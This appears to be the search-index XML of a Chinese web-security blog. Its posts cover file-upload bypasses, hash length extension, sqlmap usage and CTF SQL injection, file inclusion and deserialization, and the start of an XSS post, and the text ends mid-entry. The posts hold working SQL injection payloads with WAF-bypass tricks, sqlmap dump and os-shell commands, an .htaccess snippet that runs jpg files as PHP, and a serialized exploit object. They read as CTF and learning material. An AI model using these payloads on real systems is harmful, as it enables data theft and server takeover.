<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[文件上传的简单介绍]]></title>
    <url>%2F2019%2F08%2F29%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[文件上传首先我们通过一个网站上传一个非法格式的文件1.在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。2.如果网页未弹窗，而在页面弹窗，则考虑后端验证 空字节的理解字符串以%00（空字节）作为结束符 文件上传的基本流程1.图片是否正常上传2.图片上传的内容是否被感染（内容替换）3.上传的域名是否是目标服务器4.如果域名不是目标服务器，那就判断解析图片的服务器是否解析（PHP,ASP,ASPX,JSP,CFM,SHRML）等5.上传的目录是否支持解析上述格式 JS验证JS验证时前端验证绕过的一种。对于那些在客户端网页上增加JS来验证的网站，只需要在console上写改成想要的逻辑，就能往服务器发送恶意的PHP文件。 截断上传由于服务器端PHP存在空字节漏洞，例如ereg()函数就存在空字节漏洞，如果通过抓包软件将发送到服务器的上传文件的包截获，并将文件名字改成a.jpg%00.php，在服务器端时通过以下语句来判断是否是jpg的：ereg(&#39;jpg$&#39;,urldecode($file[&#39;name&#39;]));该文件名经过该函数会判断成功，实际上空字节将jpg的后缀阶段了，从而上传的时一个php文件。 黑名单上传验证绕过黑名单上传验证的几种方法：1.将文件的后缀名大小写互换2.如果只解释PHP可以尝试将文件后缀改为php3,php4,php5,phtml 二次上传漏洞的简要分析二次上传 解析漏洞IIS解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。文件解析形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa,/test.cer,/test.cdx IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。例如 a.aspx.a;.a.aspx.jpg..jpg Apache解析漏洞原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar其中owf和rar 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 形式：www.xxxx.xxx.com/test.php.php123 其余配置问题导致的漏洞：（1）如果在 Apache 的 conf 里有这样一行配置AddHandler php5-script .php 这时只要文件名里包含php， 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置AddType application/x-httpd-php .jpg即使扩展名是 jpg，一样能以 php 方式执行。 Nginx解析漏洞原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为phpinfo.jpg/1.php，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。 形式：www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg/.php ashx上传如果服务器过滤了asa,cer,cdx,htr,aspx,php,jsp等脚本，如果想要突破服务器，可以使用ashx脚本，用ashx来写一个asp的一句话到当前目录。 保存为ashx，然后调价一个ashx的上传类型，上传成功后访问http://www.xxx.com/admin/eWebEditor/UploadFile/2010821235545.ashx就会在当前目录生成一伙人root.asp的木马，用lake2的一句话链接就能见到hello world!了。因为网站再过滤常见脚本的时候把ashx给漏了… .htaccess上传再网站的目录下新建一个名为.htaccess的文件，并在文件中添加代码： 1234&lt;Files *.jpg&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-php&lt;/Files&gt; 这样网页再访问当前目录下的文件的时候，所有的jpg文件都会被解析为php 修补文件上传漏洞的一些建议1.文件上传的目录设置为不可执行2.结合使用MIME Type来判断文件的类型3.使用随机数改写文件名和文件路径4.单独设置文件服务器的域名]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF题目-哈希长度拓展攻击]]></title>
    <url>%2F2019%2F07%2F09%2FCTF%E9%A2%98%E7%9B%AE-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/1848 Message authentication codes (MACs)是用于验证信息真实性的。一般的MAC算法是这样的：服务器把secret和message连接到一起，然后用消息摘要算法如MD5或SHA1取摘要。研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。 这是一张MD5算法的流程图，根据这张图我们可以把MD5算法的流程，简单分为下面几步： 1.把消息分为n个消息块。2.对最后一个消息块进行消息填充。3.每个消息块会和一个输入量做运算，把运算结果作为下一个输入量。 计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit 的消息（即64 byte ）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为： 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 无需关心计算细节，我们只需要知道经过一次消息再要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。 拓展攻击的实现下面是一道CTF题目中获取的服务器端PHP代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php&lt;html&gt;&lt;body&gt;&lt;pre&gt;$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123;# ===俩边不管值还是类型都要一致 if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag);#exit()/die() 函数输出一条消息，并退出当前脚本 &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; &lt;/pre&gt;&lt;h1&gt;Admins Only!&lt;/h1&gt;&lt;p&gt;If you have the correct credentials, log in below. If not, please LEAVE.&lt;/p&gt;&lt;form method="POST"&gt; Username: &lt;input type="text" name="username"&gt; &lt;br&gt; Password: &lt;input type="password" name="password"&gt; &lt;br&gt; &lt;button type="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;?&gt; flag获取的要求是：传进一个cookie使getmein等于md5($secret . urldecode($username . $password))且后面部分不能为adminadmin,也就是说需要构造getmein的cookie和他那串字符相同就可以。 我们已知当username和password都等于admin时得到的MD5摘要值，想要构造一个password，能够知道得到的MD5值 已知$secret长度为15，先进行消息的填充，前面的A是随便写的，为了占15个字符。填充如下: 然后在后面跟加附加值，随便写什么： 然后去掉前面原本的username值，剩余的就是需要输入的password值： adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00dawn urlencode之后为:adminadmin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dawn 现在我们在不知道具体 $secret 的情况下，已经得知了md5(secert+adminadmin)的值为571580b26c65f306376d4f64e53cb5c7，以及​$sercret的位数。而我们得到的 hash 值正是下一轮摘要经过高地位互换的链变量。 在网上找到计算MD5的代码，只要把初始向量变成已知的那个HASH值就可以了。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP的使用]]></title>
    <url>%2F2019%2F07%2F05%2FSQLMAP%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Sqlmap使用Sqlmap有一些常用的命令后缀，详细见命令大全 GET注入查找Mysql数据库中的名称python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; --dbs 然后Sqlmap会自动进行sql注入，可以在注入过程中选择注入的方式，筛选掉可能性不大的数据库，最后工具能够显示出所有数据库的名称，如下图所示 查找表的名称经过上述的阶段获取数据库的名称后，就可以用来注入查找各个表的名称，以BWVS数据库为例 python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS --tables 很快工具就能够返回BWVS数据库下的各个表的名称，如下图所示： 查找字段的名称同理可以通过数据库，表来查找到里面字段的名称，以BWVS中的user表为例：python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS -T user --columns 工具输出的结果如下图所示： 获取字段的值对于上述扫描出的结果，即bill,pwd,uid,uname这几个字段名称，可以通过如下指令来注入获取字段下的值 python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS -T user -C &quot;bill,pwd,uid,uname&quot; --dump 输出的结果如下所示： 检测级别–level参数此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。 Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示： 12345678910111213141516&lt;test&gt; &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&lt;/title&gt; &lt;stype&gt;1&lt;/stype&gt; &lt;level&gt;2&lt;/level&gt; &lt;risk&gt;1&lt;/risk&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;where&gt;1&lt;/where&gt; &lt;vector&gt;AND [INFERENCE]&lt;/vector&gt; &lt;request&gt; &lt;payload&gt;AND [RANDNUM]=[RANDNUM]&lt;/payload&gt; &lt;comment&gt;[GENERIC_SQL_COMMENT]&lt;/comment&gt; &lt;/request&gt; &lt;response&gt; &lt;comparison&gt;AND [RANDNUM]=[RANDNUM1]&lt;/comparison&gt; &lt;/response&gt; &lt;/test&gt; 在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。 risk标签的含义见后文。 检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的， 检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。 若不是很清楚注入点在哪里可以设置一个比较高的检测级别。 强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。 –risk此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。 风险等级2添加了基于时间的注入测试，等级3添加了OR测试。 若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。 因此用户需要能控制风险等级避开有潜在风险的payload。 POST注入可以通过使用–method=METHOD 强制使用给定的HTTP方法如与网站是通过POST来传递信息，则需要使用到BRUP截获请求包，然后将请求包中的内容前加到sqlmap的后缀中实行注入，例如：--data=DATA 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data=&quot;id=1&quot; -f --banner --dbs --users cookie注入如果网站需要账号密码登陆，则在进行SQL注入测试时可以考虑使用cookie，使用方法就是在命令末尾添加-cookie，下面是一个例子：D:\sqlmap&gt;python sqlmap.py -u &quot;http://demo.rushrush.com/dvwa/vulnerabilities/sqli_blind/?id=221&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=6rub5m2okhp2ib7u7ruj76ebt1&quot; --dbs 通过以上命令可以像前文的相似命令一样获取数据库名字，cookie只不过多了一个登陆凭证而已 属性头注入有些参数可能是通过一个包的属性头来传输的，因此可以通过属性头来进行SQL注入，在sqlmap中可以用--referer来实现注入，因为sqlmap可以在请求中伪造HTTP中的referer，当-level参数设定为3或者3以上的时候会尝试对referer注入 添加额外的HTTP头的参数为-headers 注入过程中*的使用在输入过程中，在一个注入点后加*，可以使得该注入点的优先级别最高 命令执行通过命令执行可以取得服务器端的shellsqlmap进行命名执行可以在语句后加后缀-os-shell要执行以上命令，首先要确保该网页确实存在SQL注入漏洞 如上图所示选择服务器端语言，另外可以选择服务器端上传木马的目录，可以选择2来人为选定，前提是必须爆出网站的物理路径：此方法比较多，比如：PHPinfo文件，访问错误报路径，debug调试开启爆路径等。 上传木马成功后，可以通过访问上图所示的路径来执行，下图是访问该路径并执行命令显示当前路径所有文件的结果 数据包注入因为前面那些添加属性头，增加cookie的方法比较麻烦，因此就出现了从文件读取数据包来进行注入的方式，其实现的后缀为-r 结合burpsuite来使用sqlmap： （1）浏览器打开目标地址http://www.antian365.com （2）配置burp代理(127.0.0.1:8080)以拦截请求 （3）点击登录表单的submit按钮 （4）Burp会拦截到了我们的登录POST请求 （5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下 （6）运行sqlmap并使用如下命令： ./sqlmap.py -r post.txt明显语句长度短了很多。。 常用参数可以添加后缀-proxy来实现代理，例如-proxy &quot;http://127.0.0.1:8080&quot;可以实现burp的截获 -threads采用多线程，后面接想要的线程数 -sql-query执行指定的sql语句 file-read读取指定文件 file-write``file-dest写入本地文件，前面一个加本地目录，后一个加服务器的指定位置 dbms指定数据库类型（mysql,oracle,qostgreSQL…） tamper自定义脚本sqlmap下的tamper文件夹下存放的是一些脚本，也可以通过添加自己写的脚本来运行。 WAF，Web Application Firewall，即网站应用级入侵防御系统，通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护，有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。 为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。 当原始注入遇到困难时，可尝试加载相应脚本，进行绕过，说不定会有意外惊喜。在sqlmap的原命令中加入以下代码，即可使用脚本，进行更加强有力的渗透。 --tamper“脚本名称” sqlmap版本当前为1.2.7.20，共有57个tamper脚本，与1.0版本相比新增了19个脚本。 sqlmap dns查询利用sqlmap dns后缀来进行DNS查询，后缀为--dns-domain]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL MAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF题目-认真一点]]></title>
    <url>%2F2019%2F07%2F05%2FCTF%E9%A2%98%E7%9B%AE-%E8%AE%A4%E7%9C%9F%E4%B8%80%E7%82%B9%2F</url>
    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2009 拿到题目，先尝试分析，在框内输入1，网页显示you are in...接着在框内输入0，网页显示you are not in... 接着尝试输入0&#39; or &#39;1&#39;=&#39;1，网页反馈信息Sql injection detected!，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测试，如下图所示： 可知可以用的符号是or,=,(,),&#39;,&quot;被屏蔽的符号为and,,,substring,union,#,|另外空格添加在字符中间也会被屏蔽 因此可以看出本体的解题思路是使用布尔盲注。。 我们首先用%0a代替空格进行注入，命令为id=1&#39;%0aor%0a&#39;1&#39;=&#39;1，结果为you are not in...这说明用%0a代替空格的方案是正确的，但是可能or在处理中被删除了，因此用oorr来代替or进行注入，结果显示成功，由此开始布尔注入的过程。 接下来的过程中，我们用oorr替换or，并且把空格替换成%0a 获取数据库名称长度和数据库名称构造payload获取名称长度：0&#39; or (length(database())=%s) or&#39;0 构造获取名称的payload:0&#39; or (mid(database() from %s for 1))=&#39;%s&#39; or &#39;0 爆破的结果如下图所示： 可知获取到的数据库名称为ctf_sql_bool_blind 获取表名的长度和名称构造payload获取长度：0&#39; or (length((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database()))=%s) or&#39;0 获取名称的payload为：0&#39; or (mid((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database())from %s for 1)=&#39;%s&#39;)or &#39;0 爆破结果如下： 由上图可知，该数据库下由两张表，分别是fiag和users，因为在最开始没有在group_concat里面加separator ‘@’，所以两个名称都连在一起了，原因是默认的分隔符不知道是什么，所以程序就跳过了分隔符。 获取字段名称长度和名称构造获取长度的payload:0&#39; or (length((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;))=%s) or&#39;0 获取内容的payload:0&#39; or (mid((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;)from %s for 1)=&#39;%s&#39;)or &#39;0 爆破结果如下： 获取flag的长度和内容获取长度的payload:0&#39; or (length((select %s from %s))=%s) or&#39;0 获取内容的payload:0&#39; or (mid((select %s from %s)from %s for 1)=&#39;%s&#39;)or &#39;0 爆破结果如下： 这里多加了两位长度，因为在提交的时候发现爆破出来的flag一直报错，多加了两位后发现后面无论多少位-都能匹配上，因此认定中间的-可能是另外的符号转化的。 通过使用ascii()函数来确定该字符的确切ascii码，发现该字符是空格，因为空格已经被屏蔽了，所以用等号来确定是无法确定的。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF题目-加了料的报错注入]]></title>
    <url>%2F2019%2F07%2F04%2FCTF%E9%A2%98%E7%9B%AE-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;; 同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为username=1+&amp;+password=1，发送后网页端返回Login failed 尝试使用username=&#39; or 1=1 %23&amp;password=1进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF 测试使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同 首先对于username，分析结果如下图所示： 由返回长度可以知道信息，其中302是Login failed，238是Sql injection detected，235是username unknow error对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml 对于password，分析结果如下： 和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句 构造语句username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;发现返回的语句并没有解析user()，而是原样报错返回了 尝试使用updatexml构造语句username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;，可以发现网页返回了用户名web8@localhost 破解得到payload就可以开始注入了，首先构造一句话来得到表名字：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39; 网页返回结果为XPATH syntax error: &#39;:ffll44jj,users&#39;因此成功得到表名为ffll44jj 接下来尝试获取字段名，同样的方法，构造语句：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39; 网页成功返回XPATH syntax error: &#39;:value&#39;由此得知flag所在列的名称为value 再次构造命令来获取列中的值：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39; 然后就可以成功得到flag为XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入的总结和小技巧]]></title>
    <url>%2F2019%2F07%2F02%2FSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93%E5%92%8C%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[一些常用指令1.当前数据库的所有表select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &#39;@&#39;) from information_schema.columns where table_name=&#39;表名&#39; 布尔注入通常情况下可以使用mid和substring两个函数来进行布尔注入，哪个能用就使用哪个，另外在盲注的情况下可以使用ascii()来逐一判断表名列名等(ascii(subtring(database(),1,1))=104(ascii(mid(database(),1,1))=104 但是WAF屏蔽了逗号的使用，那么两种函数都是用不了了，这时候可以换一种表述方式来进行注入，语句如下所示：(ascii(substring(database() from 2))=111)(mid(database() from 1 for 1))=&#39;a&#39;(substring(database() from 1 for 1))=&#39;a&#39; 另外如果需要用到if语句，也可以将逻辑换一种表达方式，可以使用case when xxx then xxx else xxx end的逻辑，其具体语法如下所示 123456SELECT &lt;myColumnSpec&gt; = CASE WHEN &lt;A&gt; THEN &lt;somethingA&gt; WHEN &lt;B&gt; THEN &lt;somethingB&gt; ELSE &lt;somethingE&gt; END 举一个爆数据库名的例子：1&#39; and case when (substring((select database()) from 1 for 1)=&#39;w&#39;) then sleep(3) else sleep(0) end and &#39;1&#39;=&#39;1 select屏蔽绕过、1,：转换个别字母大小写2：输入SESELECTLECT之类的语句来代替SELECT3：用转义的URL编码来代替SELECT（不知道这么表述对不对，就是%后面跟上16进制的ascii码……）4：用/**/来隔开SELECT中的各个字母 PHP一些特性（漏洞）弱类型比较：在某些情况下，PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: 3 == ‘3ascasd’结果为true。 以0为开头的MD5值只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS PHP布尔类型bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。 截断问题ereg函数漏洞：00截断 SHA1和MD5函数这两个PHP函数因为不能处理数组，所以在传入数组的时候会发生错误，在PHP中会直接返回一个False，因此在比较两者的hash值是否相等时，可以传入两个数组，因为false=false成立 jother编码如果在网页中出现一堆+!的东西就用jother解码 在console将那堆解码的东西复制过去 按回车即可解码 设置伪造的IP地址在包头添加Client-IP:可以用来伪造当前客户端的IP地址，从而欺骗服务器 Mysql的用户名和密码Mysql中可以直接使用username和password获取当前的用户名和密码（不知道对不对）]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含的简单介绍]]></title>
    <url>%2F2019%2F07%2F02%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[文件包含文件包含漏洞服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。下面是PHP文件包含的几种函数： 1234567require()require_once()include()include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 漏洞产生原理文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。示例代码： 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 如果攻击者在filename中输入想要获取的路径和文件名，那么可以很轻松取得。 截断包含如果在服务器的php代码中已经添加好了后缀文件类型，而GET所传输的仅仅是文件名而已，此时如果想要获得服务器内任意类型的文件，则需要使用截断，截断在前面提到过，输入想要的文件后加入一个空字节，由于php本身的漏洞，仅会解释空子节前的内容。这个漏洞仅在magic_quotes_gpc = Off php版本&lt;5.3.4的条件下有用 PHP协议包含PHP协议类似于ftp协议，用于输入输出数据 比如$file_in = file_get_contents(&quot;php://input&quot;);要开启PHP协议必须在配置文件中设置allow_url_include&amp;&amp;allow_url_fopen=On而且发送的信息需要通过POST协议提交，举个例子：在URL中在网站附加信息?f=php://input并在POST中输入想要发送的信息 远程文件包含PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 通过远程文件包含漏洞，包含php.txt可以解析。http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt 文件包含漏洞的修补1.过滤./.2.白名单验证（只能包含当前目录下的php文件）3.最好不要让客户端控制文件包含目录的地址 另一种文件包含的方式可以利用Apache的日志系统来实现文件包含，在URL数据传入的字段注入PHP代码，然后再访问日志文件从而执行之前注入的代码 一个函数$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])可以通过传入两个值来分别代表命令和传入的值 PHP命令执行的几个函数exec() system() popen() passthru() proc_open() pcntl_exec() shell_exec() 反引号实际上是使用shell_exec()函数 反序列化序列化就是通过serialize()函数来将一个数组转换成字符串，从而可以输出数组的内容反序列化就是将字符串转化成数组，通过unserialize()来实现 在研究反序列化漏洞的时候，碰见这几个魔法函数就要仔细研究研究了： 123456789__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用 举个例子，以一道CTF题目为例子 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 123456789101112131415&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作 直接构造序列化对象传过去O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 就行了]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2F2019%2F06%2F30%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[JS和AJAX的一些基础1.window.onload()指的是等网页的元素都加载完毕就会执行这段代码如果存在两个onload，那么只会执行后一个 12window.onload = function() &#123; alert(“text1”);&#125;; window.onload = function() &#123; alert(“text2”);&#125;; 2.onreadystatechange 事件：当请求被发送到服务器时，我们需要执行一些基于响应的任务。每当 readyState 改变时，就会触发 onreadystatechange 事件。下面是一个实例： 1234567xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.getElementById("myDiv").innerHTML=xmlhttp.responseText; &#125;&#125; Ajax跨域正常的跨域实现方案1.允许单个域名访问若需要指定某域名(http://client.runoob.com)跨域访问，只需要在(http://server.runoob.com/server.php)文件的头部添加如下代码：header(&#39;Access-Control-Allow-Origin:http://client.runoob.com&#39;); 2.允许多个域名访问在头部文件中添加如下代码： 12345$origin = isset($_SERVER['HTTP_ORIGIN'])? $_SERVER['HTTP_ORIGIN'] : ''; $allow_origin = array( 'http://client1.runoob.com', 